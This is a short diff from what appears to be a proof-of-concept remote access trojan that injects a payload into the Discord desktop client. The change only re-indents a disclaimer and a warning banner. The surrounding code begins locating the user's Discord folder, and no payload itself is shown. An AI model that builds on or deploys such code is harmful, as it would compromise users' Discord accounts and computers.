@@ -5,9 +5,9 @@ class Program
 {
     static void Main()
     {
-	Console.WriteLine("This application is meant as a PROOF OF CONCEPT! I am not responsible for any misuse of this application.  Express RAT proof of concept by https://github.com/iiDk-the-actual/POC.DiscordReactRAT");
-	Console.WriteLine("Continuing to run this application will result in the payload being added to your Discord's files. Press any key to continue.");
-	Console.ReadKey();
+		Console.WriteLine("This application is meant as a PROOF OF CONCEPT! I am not responsible for any misuse of this application.  Express RAT proof of concept by https://github.com/iiDk-the-actual/POC.DiscordReactRAT");
+		Console.WriteLine("Continuing to run this application will result in the payload being added to your Discord's files. Press any key to continue.");
+		Console.ReadKey();
 	
         string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         string discordPath = Path.Combine(localAppDataPath, "Discord");
